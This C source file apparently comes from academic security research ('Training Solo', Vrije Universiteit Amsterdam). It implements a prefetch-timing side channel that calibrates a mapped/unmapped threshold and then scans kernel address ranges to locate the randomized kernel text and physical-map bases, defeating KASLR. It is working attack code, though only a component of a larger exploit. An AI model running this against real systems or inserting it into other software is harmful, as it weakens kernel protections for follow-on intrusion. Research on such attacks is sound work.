/*
 * Training Solo
 * Friday, March 22th 2024
 *
 * Sander Wiebing - s.j.wiebing@vu.nl
 * Cristiano Giuffrida - giuffrida@cs.vu.nl
 * Vrije Universiteit Amsterdam - Amsterdam, The Netherlands
 *
 */

#include <sys/mman.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <time.h>
#include <string.h>
#include <assert.h>
#include <sched.h>


#define PHYS_MAP_START 0xffff800000000000
#define PHYS_MAP_END   0xffffc87fffffffff
#define PHYS_ALIGNMENT 1 << 30 // 1 GB

#define TEXT_START 0xffffffff80000000
#define TEXT_END   0xffffffffc0000000
#define TEXT_ALIGNMENT (1 << 21) // 2 MB

#if defined(INTEL_10_GEN)
    #define EXTRA_THRESHOLD  5
    #define THRESHOLD_MAPPED 8

#elif defined(INTEL_11_GEN)
    #define EXTRA_THRESHOLD  1
    #define THRESHOLD_MAPPED 6

#elif defined(INTEL_13_GEN)
    #define EXTRA_THRESHOLD  1
    #define THRESHOLD_MAPPED 6

#else
    #error "Not supported micro-architecture"
    // silence undefined errors
    #define EXTRA_THRESHOLD 0
    #define THRESHOLD_MAPPED 0
#endif

#define ITERATIONS_INIT 1000
#define ITERATIONS_TEST 100

uint8_t initialized = 0;
uint64_t threshold;

static int compare(const void *x, const void *y)
{
    return (*(uint64_t *)x - *(uint64_t *)y);
}

void sort_ascending(uint64_t x[], unsigned n)
{
    qsort(x, n, sizeof(uint64_t), compare);
}

static __always_inline __attribute__((always_inline)) void cpuid(void) {
     asm volatile ("xor %%rax, %%rax\ncpuid\n\t" ::: "%rax", "%rbx", "%rcx", "%rdx");
}


__always_inline static void prefetch(uint8_t * addr)
{
	asm volatile (
        "xor %%rax, %%rax\n\t"
		"CPUID\n\t"
        "prefetcht0 (%0)\n\t"
        "xor %%rax, %%rax\n\t"
		"CPUID\n\t"
		:
		: "r" (addr)
		: "%rax", "%rbx", "%rcx", "%rdx"
	);
}

__always_inline static void evict_negative_cache() {


    for (size_t i = 0; i < 8; i++)
    {
        uint64_t addr =  0xffffffff + (rand() & 0xffffffff);
        asm volatile("prefetcht0 (%0)"
                :
                : "r" (addr));
    }

    cpuid();

}



__always_inline static uint64_t time_prefetch(uint8_t * addr)
{
	unsigned start_low, start_high, end_low, end_high;
	uint64_t start, end, duration;

	asm volatile (
        "xor %%rax, %%rax\n\t"
		"CPUID\n\t"
		"RDTSC\n\t"
		"mov %%edx, %0\n\t"
		"mov %%eax, %1\n\t"
        "prefetcht0 (%4)\n\t"
		"RDTSCP\n\t"
		"mov %%edx, %2\n\t"
		"mov %%eax, %3\n\t"
        "xor %%rax, %%rax\n\t"
		"CPUID\n\t"
		: "=r" (start_high), "=r" (start_low), "=r" (end_high), "=r" (end_low)
		: "r" (addr)
		: "%rax", "%rbx", "%rcx", "%rdx"
	);

	start = ((uint64_t)start_high << 32) | (uint64_t)start_low;
	end = ((uint64_t)end_high << 32) | (uint64_t)end_low;
	duration = end - start;

    evict_negative_cache();

	return duration;
}

__always_inline static uint64_t time_prefetch_overhead()
{
	unsigned start_low, start_high, end_low, end_high;
	uint64_t start, end, duration;

	asm volatile (
        "xor %%rax, %%rax\n\t"
		"CPUID\n\t"
		"RDTSC\n\t"
		"mov %%edx, %0\n\t"
		"mov %%eax, %1\n\t"
        // "prefetcht0 (%4)\n\t"
		"RDTSCP\n\t"
		"mov %%edx, %2\n\t"
		"mov %%eax, %3\n\t"
        "xor %%rax, %%rax\n\t"
		"CPUID\n\t"
		: "=r" (start_high), "=r" (start_low), "=r" (end_high), "=r" (end_low)
		: "r" (0)
		: "%rax", "%rbx", "%rcx", "%rdx"
	);

	start = ((uint64_t)start_high << 32) | (uint64_t)start_low;
	end = ((uint64_t)end_high << 32) | (uint64_t)end_low;
	duration = end - start;

	return duration;
}


__attribute__ ((noinline)) static uint8_t address_is_mapped(uint8_t * addr) {

    uint64_t times[ITERATIONS_TEST];

    prefetch(addr);

    for (size_t i = 0; i < ITERATIONS_TEST; i++)
    {
        times[i] = time_prefetch(addr);
    }

    sort_ascending(times, ITERATIONS_TEST);

    if (times[ITERATIONS_TEST/2] > threshold) {
        return 0;
    }

    return 1;

}

// ------------------------------------------------------------------------
// Find the section start

uint64_t find_section_start(uint64_t start, uint64_t end, uint64_t alignment){


    uint64_t kern_address;
    uint8_t is_mapped;

    for (kern_address = start; kern_address < end; kern_address += alignment)
    {
        is_mapped = address_is_mapped((uint8_t *) kern_address);
        if (is_mapped) {
            return kern_address;
        }

    }
    printf("Finding section start failed!\n");
    return 0;

}

// Find mapped address prior first non-mapped address, searching forwards
uint64_t find_last_mapped_address_forward(uint64_t last_mapped, uint64_t end, uint64_t alignment, uint64_t min_gap){


    uint64_t kern_address;
    uint8_t is_mapped;

    for (kern_address = last_mapped; kern_address < end; kern_address += alignment)
    {
        is_mapped = address_is_mapped((uint8_t *) kern_address);
        if (is_mapped) {
            last_mapped = kern_address;
        } else if (kern_address - last_mapped > min_gap) {
            return last_mapped;
        }
    }
    printf("Finding find_last_mapped_address_forward end failed!\n");
    return 0;

}

// Find first mapped address searching backwards
uint64_t find_last_mapped_address(uint64_t start, uint64_t end, uint64_t alignment){
    uint64_t kern_address;
    uint8_t is_mapped;


    for (kern_address = end; kern_address >= start; kern_address -= alignment)
    {
        is_mapped = address_is_mapped((uint8_t *) kern_address);
        if (is_mapped) {
            return kern_address;
        }

    }
    printf("Finding section end failed!\n");
    return 0;

}

// ------------------------------------------------------------------------
// Initialize the overhead

void initialize_kaslr_prefetch() {

    uint64_t time;
    uint64_t times[ITERATIONS_INIT];
    uint64_t min_mapped, min_unmapped;
    uint64_t q3_mapped, q3_unmapped;

    printf("======== Initialize KASLR Prefetch Side-Channel =======\n");

// #ifdef VERBOSE
    printf("           | min |  q1 | med |  q3 | max\n");
// #endif

    for (size_t i = 0; i < ITERATIONS_INIT; i++)
    {
        times[i] = time_prefetch_overhead();
    }

    sort_ascending(times, ITERATIONS_INIT);

// #ifdef VERBOSE
    printf("  overhead | %3lu | %3lu | %3lu | %3lu | %3lu\n",
		times[0], times[ITERATIONS_INIT/4], times[ITERATIONS_INIT/2], times[ITERATIONS_INIT*3/4], times[ITERATIONS_INIT-1]);
// #endif
    char * test_p;

    for (size_t i = 0; i < ITERATIONS_INIT; i++)
    {
        *(volatile char *) &test_p;

        times[i] = time_prefetch((uint8_t *)test_p);

    }

    sort_ascending(times, ITERATIONS_INIT);
// #ifdef VERBOSE
    printf("    mapped | %3lu | %3lu | %3lu | %3lu | %3lu\n",
		times[0], times[ITERATIONS_INIT/4], times[ITERATIONS_INIT/2], times[ITERATIONS_INIT*3/4], times[ITERATIONS_INIT-1]);
// #endif

    min_mapped = times[0];
    q3_mapped = times[ITERATIONS_INIT*3/4];

    for (size_t i = 0; i < ITERATIONS_INIT; i++)
    {
        times[i] = time_prefetch((uint8_t *)0xffff800000000000);
    }

    sort_ascending(times, ITERATIONS_INIT);
    printf("  unmapped | %3lu | %3lu | %3lu | %3lu | %3lu\n",
		times[0], times[ITERATIONS_INIT/4], times[ITERATIONS_INIT/2], times[ITERATIONS_INIT*3/4], times[ITERATIONS_INIT-1]);

    min_unmapped = times[0];
    q3_unmapped = times[ITERATIONS_INIT*3/4];

    threshold = (min_unmapped + q3_mapped) / 2;

    printf("Threshold: %ld, accuracy:\n", threshold);

    uint64_t hits_mapped = 0;
    uint64_t hits_unmapped = 0;

    for (size_t i = 0; i < ITERATIONS_INIT / 10; i++)
    {
        hits_mapped += address_is_mapped((uint8_t *) &test_p);
        hits_unmapped += address_is_mapped((uint8_t* ) 0xffff800000000000);
    }

    printf("%10s %4s|%4s\n", "", "hit", "mis");
    printf("%10s %4lu|%4lu\n", "mapped", hits_mapped, ITERATIONS_INIT / 10 - hits_mapped);
    printf("%10s %4lu|%4lu\n", "unmapped", hits_unmapped, ITERATIONS_INIT / 10 - hits_unmapped);

}

uint64_t find_phys_map_start() {

    if (!initialized) {
        initialized = 1;
        initialize_kaslr_prefetch();
    }

    return find_section_start(PHYS_MAP_START, PHYS_MAP_END, PHYS_ALIGNMENT);
}


uint64_t find_text_map_start() {

    if (!initialized) {
        initialized = 1;
        initialize_kaslr_prefetch();
    }

    return find_section_start(TEXT_START, TEXT_END, TEXT_ALIGNMENT);
}
